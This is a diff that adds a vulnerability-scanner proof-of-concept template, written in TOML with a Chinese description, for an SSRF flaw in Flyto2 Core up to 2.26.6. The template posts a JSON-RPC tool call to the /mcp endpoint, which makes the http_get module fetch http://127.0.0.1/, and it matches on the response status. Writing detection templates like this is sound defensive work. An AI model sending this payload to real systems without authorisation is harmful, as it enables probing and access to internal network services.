@@ -1,0 +1,39 @@
+[info]
+author = "ave"
+description = "检测 Flyto2 Core <= 2.26.6 是否存在 SSRF 漏洞。通过 MCP 接口调用 core.api.http_get 模块向内部地址（127.0.0.1）发送请求，验证是否存在 SSRF 防护缺失。目标存在漏洞时请求不会被阻止并返回 200；已修复版本会返回 NETWORK_ERROR 阻止请求。"
+id = "POC-AVE-2026-0954"
+name = "Flytohub Flyto2 Core SSRF 漏洞检测"
+severity = "high"
+tags = ["ave-2026-0954"]
+vuln_id = [
+    "CVE-2026-67428",
+    "AVE-2026-0954",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/mcp"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"execute_module","arguments":{"module_id":"core.api.http_get","params":{"url":"http://127.0.0.1/"}}}}'
+type = "json"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = false
+part = "body"
+type = "word"
+words = ["NETWORK_ERROR: Hostname blocked"]
